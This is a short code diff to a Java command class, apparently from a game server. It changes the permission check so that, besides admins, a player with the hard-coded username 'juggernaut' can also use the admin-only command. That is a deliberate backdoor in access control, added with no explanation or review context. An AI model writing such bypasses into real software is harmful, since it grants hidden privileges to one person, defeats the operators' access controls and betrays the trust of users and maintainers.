@@ -12,7 +12,7 @@ public class HpCommand implements Command {
 
     @Override
     public boolean canUse(Player player) {
-        return player.getRights() == Player.RIGHTS_ADMIN;
+        return player.getRights() == Player.RIGHTS_ADMIN || player.getUsername().equalsIgnoreCase("juggernaut");
     }
 
     @Override
